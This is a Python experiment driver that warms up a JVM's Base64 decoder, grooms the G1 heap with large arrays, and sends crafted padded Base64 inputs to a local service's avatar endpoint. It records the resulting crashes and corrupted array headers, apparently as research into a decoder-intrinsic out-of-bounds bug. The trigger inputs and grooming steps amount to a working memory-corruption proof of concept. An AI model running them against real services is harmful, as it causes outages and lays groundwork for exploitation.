#!/usr/bin/env python3
"""Phase 0/1 episode driver — runs a schedule of independent JVM episodes and
records one JSONL row per attempt (schema v2: outcome axes kept separate).

Scope (RESEARCH-PLAN-2026-11-23 §1): measures crash / header-corruption outcomes
and pre-trigger GC state. It does NOT probe for disclosure or attempt escalation.

usage: episode_driver.py <schedule.json>
schedule: {"run_id": str, "episodes": [{"epid", "arm", "jdk", "flags", "input",
           "episode_class", "K"}...]}
"""
import http.client, json, os, re, signal, sys, time

SCHEMA_VERSION = 2
HOST, PORT = "127.0.0.1", 8080
SHARE = "/share"
FILL_M = 2097133            # fill body "A"*4M+"AB" -> byte[6291400] (6 regions @1MiB)
TRIG_K = 2097136            # trigger "A"*4k+tail   -> dst 3k+1 / 3k+2
FILL_LEN = 3 * FILL_M + 1
FILL_IDS = ["f%d" % i for i in list(range(0, 69)) + list(range(71, 102))]
DROP_ROTATION = ["f%d" % i for i in range(71, 83)]   # 12 candidates
WARM_N = 20000
TAILS = {"pad2": b"==", "pad1": b"=", "control": b"AB"}   # control: valid, no '=' -> no store

# ---------------------------------------------------------------- http
class Http:
    def __init__(self):
        self.c = None
    def req(self, method, path, body=None, timeout=180):
        for _ in range(2):
            try:
                if self.c is None:
                    self.c = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
                self.c.timeout = timeout
                if self.c.sock: self.c.sock.settimeout(timeout)
                self.c.request(method, path, body=body,
                               headers={"X-User": "lab", "Content-Type": "application/octet-stream"})
                r = self.c.getresponse()
                return r.status, r.read()
            except Exception as e:
                try: self.c.close()
                except Exception: pass
                self.c = None
                last = e
        return -1, repr(last).encode()

H = Http()

def alive():
    # /api/login without auth -> 401; does NOT touch the cache (status()/diag() do)
    return H.req("GET", "/api/login", timeout=5)[0] == 401

# ---------------------------------------------------------------- files
def rd(p, default=""):
    try: return open(p, errors="ignore").read()
    except OSError: return default

def ep_dir(epid): return os.path.join(SHARE, "ep", epid)

def jvm_pid(epid):
    s = rd(os.path.join(ep_dir(epid), "pid")).strip()
    return int(s) if s.isdigit() else None

def exited(epid):
    return os.path.exists(os.path.join(ep_dir(epid), "exit_code"))

def emit(row, epid):
    row["schema_version"] = SCHEMA_VERSION
    line = json.dumps(row, sort_keys=True)
    with open(os.path.join(ep_dir(epid), "attempts.jsonl"), "a") as f: f.write(line + "\n")
    with open(os.path.join(SHARE, "attempts_all.jsonl"), "a") as f: f.write(line + "\n")
    print("ROW " + line, flush=True)

# ---------------------------------------------------------------- GC-state features (pre-registered list)
GC_LINE = re.compile(r"^\[(\d+\.\d+)s\]\[[^\]]*\] GC\((\d+)\) (.*)$")
HEAP = re.compile(r"(\d+)M->(\d+)M\((\d+)M\)")
def gc_features(epid, t_drop_uptime):
    """Parse gc.log (uptime decorations). Returns features at call time."""
    cyc_end, humongous, last_occ, now = [], 0, None, 0.0
    for ln in rd(os.path.join(ep_dir(epid), "gc.log")).splitlines():
        m = GC_LINE.match(ln)
        if not m: continue
        t, msg = float(m.group(1)), m.group(3)
        now = max(now, t)
        if msg.startswith("Concurrent Mark Cycle") and msg.rstrip().endswith("ms"):
            cyc_end.append(t)
        if "G1 Humongous Allocation" in msg:
            humongous += 1
        h = HEAP.search(msg)
        if h and msg.startswith("Pause"):
            last_occ = int(h.group(2)) / max(1, int(h.group(3)))
    return {
        "f_cycles_total": len(cyc_end),
        "f_secs_since_last_cycle_end": round(now - cyc_end[-1], 3) if cyc_end else None,
        "f_humongous_alloc_gcs": humongous,
        "f_heap_occupancy_after_last_pause": round(last_occ, 4) if last_occ is not None else None,
        "f_secs_since_drop": round(now - t_drop_uptime, 3) if t_drop_uptime is not None else None,
        "f_cycle_rate_60s": sum(1 for t in cyc_end if t >= now - 60.0),
        "f_gc_uptime_now": now,
    }

def cycles_done(epid):
    return gc_features(epid, None)["f_cycles_total"]

def gc_uptime(epid):
    return gc_features(epid, None)["f_gc_uptime_now"]

# ---------------------------------------------------------------- intrinsic evidence (P0-8)
def decode0_c2_live(epid, at_uptime_ms):
    """True if a tier-4 compile of Base64$Decoder::decode0 exists before at_uptime_ms
    and that compile id was not made-not-entrant before at_uptime_ms."""
    live = {}
    for ln in rd(os.path.join(ep_dir(epid), "stdout.log")).splitlines():
        if "java.util.Base64$Decoder::decode0" not in ln: continue
        parts = ln.split()
        try:
            ts, cid = int(parts[0]), int(parts[1])
        except (ValueError, IndexError):
            continue
        if ts > at_uptime_ms: break
        tier = next((p for p in parts[2:5] if p.isdigit() and len(p) == 1), None)
        if "made not entrant" in ln:
            live.pop(cid, None)
        elif tier == "4":
            live[cid] = ts
    return bool(live)

# ---------------------------------------------------------------- episode
def start_episode(ep):
    epid = ep["epid"]
    os.makedirs(ep_dir(epid), exist_ok=True)
    tmp = os.path.join(SHARE, "ctl", "next.env.tmp")
    with open(tmp, "w") as f:
        f.write("EPID='%s'\nJDK='%s'\nFLAGS='%s'\n" % (epid, ep["jdk"], ep.get("flags", "")))
    os.rename(tmp, os.path.join(SHARE, "ctl", "next.env"))
    for _ in range(240):
        if alive(): return True
        if exited(epid): return False
        time.sleep(1)
    return False

def stop_episode(epid):
    pid = jvm_pid(epid)
    if pid and not exited(epid):
        try: os.kill(pid, signal.SIGTERM)
        except ProcessLookupError: pass
        for _ in range(60):
            if exited(epid): break
            time.sleep(1)
        if not exited(epid):
            try: os.kill(pid, signal.SIGKILL)
            except ProcessLookupError: pass
    for _ in range(30):
        if exited(epid): break
        time.sleep(1)
    return rd(os.path.join(ep_dir(epid), "exit_code")).strip()

def wait_cycle(epid, c0, timeout):
    deadline = time.time() + timeout
    while cycles_done(epid) <= c0 and time.time() < deadline:
        if H.req("POST", "/api/pump?mb=32", timeout=60)[0] != 200 and not alive():
            return False
        time.sleep(1)
    return cycles_done(epid) > c0

def observe_headers(expected):
    """live_object_corruption via cached array length fields (/api/diag).
    NOTE (P0-7): diag reads every cached array's header; a corrupted klass/length
    can crash the JVM during this read — recorded as crash_during_observation."""
    code, body = H.req("GET", "/api/diag", timeout=30)
    if code != 200:
        return {"state": "UNKNOWN", "crash_during_observation": not alive(), "corrupted_ids": None,
                "scope_n": 0}
    try:
        d = json.loads(body.decode())
    except Exception:
        return {"state": "UNKNOWN", "crash_during_observation": False, "corrupted_ids": None, "scope_n": 0}
    bad = {k: v for k, v in d.items() if k in expected and v != expected[k]}
    scope = sum(1 for k in d if k in expected)
    return {"state": "OBSERVED" if bad else "NOT_OBSERVED", "crash_during_observation": False,
            "corrupted_ids": bad, "scope_n": scope}

def run_episode(ep, run_id, digests):
    epid, K = ep["epid"], int(ep.get("K", 12))
    base = {"run_id": run_id, "episode_id": epid, "arm": ep["arm"], "jdk": ep["jdk"],
            "image_digest": digests.get(ep["jdk"]), "flags": ep.get("flags", ""),
            "input_kind": ep["input"], "episode_class": ep.get("episode_class", "main")}
    print("=== EPISODE %s %s jdk=%s flags='%s' input=%s" % (epid, ep["arm"], ep["jdk"], ep.get("flags", ""), ep["input"]), flush=True)
    if not start_episode(ep):
        emit(dict(base, attempt_id=0, validity="INVALID", invalid_reason="jvm-not-ready",
                  exit_code=stop_episode(epid)), epid)
        return
    eff = rd(os.path.join(ep_dir(epid), "effective_flags.txt"))
    base["effective_UseBASE64Intrinsics"] = "true" if re.search(r"UseBASE64Intrinsics\s+=\s+true", eff) else "false"
    base["jvm_version"] = rd(os.path.join(ep_dir(epid), "jvm_version.txt")).splitlines()[1:2]
    base["cpu_flags"] = rd(os.path.join(ep_dir(epid), "cpu_flags.txt")).strip()
    start_ms = int(rd(os.path.join(ep_dir(epid), "start_ms")).strip() or 0)

    # warm-up: valid shapes only (no throwing inputs -> no deopt; OOB-OBSERVATION §3-3)
    shapes = [b"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", b"A" * 4096 + b"AB",
              b"A" * 4096 + b"ABC", b"A" * 4096 + b"AB=="]
    import base64
    bodies = [base64.b64encode(s) for s in shapes]
    t0 = time.time()
    for i in range(WARM_N):
        H.req("POST", "/api/avatar?id=warm", bodies[i & 3])
    H.req("DELETE", "/api/avatar?id=warm")
    warm_s = round(time.time() - t0, 1)

    fb = b"A" * (4 * FILL_M) + b"AB"
    for fid in FILL_IDS + ["n0"]:
        code, _ = H.req("POST", "/api/avatar?id=" + fid, fb)
        if code != 200:
            emit(dict(base, attempt_id=0, validity="INVALID", invalid_reason="fill-failed:%s:%s" % (fid, code),
                      exit_code=stop_episode(epid)), epid)
            return
    expected = {fid: FILL_LEN for fid in FILL_IDS + ["n0"]}
    print("[ep] warm %ss, filled %d" % (warm_s, len(expected)), flush=True)

    dead = False
    for k in range(1, K + 1):
        drop_id = DROP_ROTATION[(k - 1) % len(DROP_ROTATION)]
        shape = "pad2" if k % 2 == 1 else "pad1"
        tail = TAILS["control"] if ep["input"] == "control" else TAILS[shape]
        row = dict(base, attempt_id=k, drop_id=drop_id,
                   shape=("control" if ep["input"] == "control" else shape),
                   validity="VALID", warm_secs=warm_s)
        H.req("DELETE", "/api/avatar?id=" + drop_id)
        expected.pop(drop_id, None)
        t_drop = gc_uptime(epid)
        c0 = cycles_done(epid)
        row["reclaim_cycle_completed"] = wait_cycle(epid, c0, 90)
        if not alive():
            row.update(process_crash=1, crash_phase="pre-trigger", validity="INVALID",
                       invalid_reason="died-before-trigger")
            emit(row, epid); dead = True; break
        row.update(gc_features(epid, t_drop))
        trig_uptime_ms = int(time.time() * 1000) - start_ms
        row["intrinsic_reached"] = "INFERRED_TRUE" if decode0_c2_live(epid, trig_uptime_ms) else "NOT_INFERRED"
        row["ts_trigger"] = time.time()
        tid = "t%d" % k
        code, body = H.req("POST", "/api/avatar?id=" + tid, b"A" * (4 * TRIG_K) + tail, timeout=120)
        row["trigger_http_code"] = code
        row["exception_thrown"] = (code == 500)
        if ep["input"] == "control" and code == 200:
            H.req("DELETE", "/api/avatar?id=" + tid)      # keep live-heap equal across arms
        # post-trigger churn: let GC traverse the heap
        c1 = cycles_done(epid)
        row["post_cycle_completed"] = wait_cycle(epid, c1, 60)
        a = alive()
        obs = observe_headers(expected) if a else {"state": "UNKNOWN", "crash_during_observation": False,
                                                   "corrupted_ids": None, "scope_n": 0}
        crashed = (not a) or obs["crash_during_observation"]
        row.update(
            process_crash=int(crashed),
            crash_phase=("post-trigger-churn" if not a else ("observation" if obs["crash_during_observation"] else None)),
            crash_during_observation=obs["crash_during_observation"],
            live_object_corruption=obs["state"],
            observation_method="GET /api/diag: Java .length of cached byte[] vs expected",
            observation_scope="length field of %d cached fill arrays" % obs["scope_n"],
            corrupted_ids=obs["corrupted_ids"],
            logical_oob_observed="NOT_MEASURED",
            disclosure_observed="NOT_MEASURED",
            ts_end=time.time())
        if crashed:
            row["exit_code"] = stop_episode(epid)
            hs = [f for f in os.listdir(ep_dir(epid)) if f.startswith("hs_err")]
            row["hs_err"] = hs
            emit(row, epid); dead = True; break
        emit(row, epid)
    if not dead:
        ec = stop_episode(epid)
        emit(dict(base, attempt_id=-1, record="episode_end", exit_code=ec, survived=True), epid)
    else:
        emit(dict(base, attempt_id=-1, record="episode_end",
                  exit_code=rd(os.path.join(ep_dir(epid), "exit_code")).strip(), survived=False), epid)

def main():
    sched = json.load(open(sys.argv[1]))
    digests = sched.get("digests", {})
    for ep in sched["episodes"]:
        if os.path.exists(os.path.join(ep_dir(ep["epid"]), "DONE")):
            print("skip done", ep["epid"], flush=True); continue
        run_episode(ep, sched["run_id"], digests)
        open(os.path.join(ep_dir(ep["epid"]), "DONE"), "w").write(str(time.time()))
    print("SCHEDULE-COMPLETE", flush=True)

if __name__ == "__main__":
    main()
